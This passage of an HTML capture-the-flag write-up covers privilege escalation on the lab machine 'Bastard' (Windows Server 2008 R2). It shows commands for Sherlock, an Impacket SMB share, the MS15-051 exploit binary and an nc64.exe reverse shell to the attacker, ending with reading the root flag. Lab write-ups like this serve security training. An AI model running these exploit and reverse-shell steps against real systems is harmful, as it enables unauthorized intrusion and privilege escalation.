+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DHCP&nbsp;Enabled:&nbsp;&nbsp;&nbsp;&nbsp;No<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;address(es)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[01]:&nbsp;10.10.10.9
+            </div>
+        </div><br>
+        <br>
+        The interesting results to note are:<br>
+        • the OS is Windows Server 2008 R2<br>
+        • This is an x64 machine<br>
+        • There aren't any Hotfixes (updates) installed<br>
+        <br>
+        Windows Server 2008 R2 is pretty old, and considering there's no updates installed there's most likely an OS exploit that will elevate us to SYSTEM.<br>
+        <br>
+        Sherlock, written by RastaMouse, is a PowerShell script that will check for local privilege escalation vulnerabilities.<br>
+        <a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a><br>
+        <br>
+        <code>wget</code> Sherlock to your attacking system and edit it with nano and write the Find-AllVulns function into the end of the script, because we want to check for all vulnerabilites.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/nishang#&nbsp;wget&nbsp;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1<br>
+                ...<br>
+                root@gotham:~/ctf/bastard/nishang#&nbsp;nano&nbsp;Sherlock.ps1&nbsp;<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Set-ExploitTable&nbsp;$MSBulletin&nbsp;$VulnStatus<br>
+                <br>
+                }<br>
+                <br>
+                Find-AllVulns
+            </div>
+        </div><br>
+        <br>
+        Serve the script to the target machine using Impacket's <code>smbserver.py</code>.<br>
+        Create a share inside the folder containing the script<br>
+        <code>smbserver.py &lt;sharename&gt; &lt;directory to share&gt;</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/priv-esc#&nbsp;smbserver.py&nbsp;PWNPLS&nbsp;./<br>
+                Impacket&nbsp;v0.9.20-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Callback&nbsp;added&nbsp;for&nbsp;UUID&nbsp;4B324FC8-1670-01D3-1278-5A47BF6EE188&nbsp;V:3.0<br>
+                [*]&nbsp;Callback&nbsp;added&nbsp;for&nbsp;UUID&nbsp;6BFFD098-A112-3610-9833-46C3F87E345A&nbsp;V:1.0<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                [*]&nbsp;Config&nbsp;file&nbsp;parsed<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Check that you can access the share from the target system<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;dir&nbsp;\\10.10.14.8\PWNPLS<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;\\10.10.14.8\PWNPLS<br>
+                <br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -a---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;29/8/2019&nbsp;&nbsp;&nbsp;6:38&nbsp;??&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16679&nbsp;Sherlock.ps1
+            </div>
+        </div><br>
+        <br>
+        And download Sherlock.ps1 to the target using <code>copy</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;copy&nbsp;\\10.10.14.8\PWNPLS\Sherlock.ps1&nbsp;./
+            </div>
+        </div><br>
+        <br>
+        Run <code>Sherlock.ps1</code> by setting the <code>ExecutionPolicy</code> to <code>Bypass</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;Set-ExecutionPolicy&nbsp;Bypass&nbsp;-Scope&nbsp;Process<br>
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;.\Sherlock.ps1<br>
+                <br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Task&nbsp;Scheduler&nbsp;.XML<br>
+                MSBulletin&nbsp;:&nbsp;MS10-092<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2010-3338,&nbsp;2010-3888<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/19930/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                <br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ClientCopyImage&nbsp;Win32k<br>
+                MSBulletin&nbsp;:&nbsp;MS15-051<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2015-1701,&nbsp;2015-2433<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/37367/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                <br>
+                ...<br>
+                <br>
+                Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Secondary&nbsp;Logon&nbsp;Handle<br>
+                MSBulletin&nbsp;:&nbsp;MS16-032<br>
+                CVEID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2016-0099<br>
+                Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;https://www.exploit-db.com/exploits/39719/<br>
+                VulnStatus&nbsp;:&nbsp;Appears&nbsp;Vulnerable<br>
+                <br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        3 potential vulnerabilties found.<br>
+        The reliable one is <code>MS15-051</code>.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>5b) MS15-051</strong></h2><br>
+        I retrieved a compiled x64 binary of the MS15-051 exploit here - <a href="https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051">https://github.com/jivoi/pentest/blob/master/exploit_win/ms15-051</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/priv-esc#&nbsp;wget&nbsp;https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Download the exploit to the target system using the smb share set up earlier with <code>copy</code>.<br>
+        This exploit requires you to run the binary and provide a privileged command to run, so run the exploit with <code>whoami</code>.<br>
+        <br>
+        You should have <code>nt/authority system</code> privileges!<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;copy&nbsp;\\10.10.14.8\PWNPLS\ms15-051.exe&nbsp;./<br>
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;.\ms15-051.exe&nbsp;whoami<br>
+                [#]&nbsp;ms15-051&nbsp;fixed&nbsp;by&nbsp;zcgonvh<br>
+                [!]&nbsp;process&nbsp;with&nbsp;pid:&nbsp;576&nbsp;created.<br>
+                ==============================<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>5c) Get an interactive SYSTEM shell</strong></h2><br>
+        In order to get a shell, download an x64 netcat windows binary and serve it to the target using your smb share.<br>
+        You can a netcat 64-bit binary from here - <a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a><br>
+            <div class="codebox">
+                root@gotham:~/ctf/bastard/priv-esc#&nbsp;wget&nbsp;https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip<br>
+                ...<br>
+                root@gotham:~/ctf/bastard/priv-esc#&nbsp;unzip&nbsp;netcat-win32-1.12.zip&nbsp;<br>
+                Archive:&nbsp;&nbsp;netcat-win32-1.12.zip<br>
+                &nbsp;&nbsp;...<br>
+                &nbsp;&nbsp;inflating:&nbsp;nc.exe<br>
+                &nbsp;&nbsp;inflating:&nbsp;nc64.exe
+            </div>
+        </div><br>
+        <br>
+        And download <code>nc64.exe</code> to the target<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;copy&nbsp;\\10.10.14.8\PWNPLS\nc64.exe&nbsp;./
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~#&nbsp;nc&nbsp;-lvnp&nbsp;9005<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9005&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run the exploit with <code>nc64.exe</code> to send yourself a SYSTEM reverse shell.<br>
+            <div class="codebox">
+                PS&nbsp;C:\inetpub\drupal-7.54&gt;&nbsp;.\ms15-051.exe&nbsp;"nc64.exe&nbsp;-e&nbsp;cmd&nbsp;10.10.14.8&nbsp;9005"<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9005&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.8]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.9]&nbsp;49190<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.1.7600]<br>
+                Copyright&nbsp;(c)&nbsp;2009&nbsp;Microsoft&nbsp;Corporation.&nbsp;&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\inetpub\drupal-7.54&gt;whoami<br>
+                whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        We're SYSTEM (again)!<br>
+        Go grab root.txt.<br>
+            <div class="codebox">
+                C:\inetpub\drupal-7.54&gt;type&nbsp;C:\Users\Administrator\Desktop\root.txt.txt<br>
+                type&nbsp;C:\Users\Administrator\Desktop\root.txt.txt<br>
+                4bf12b9...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
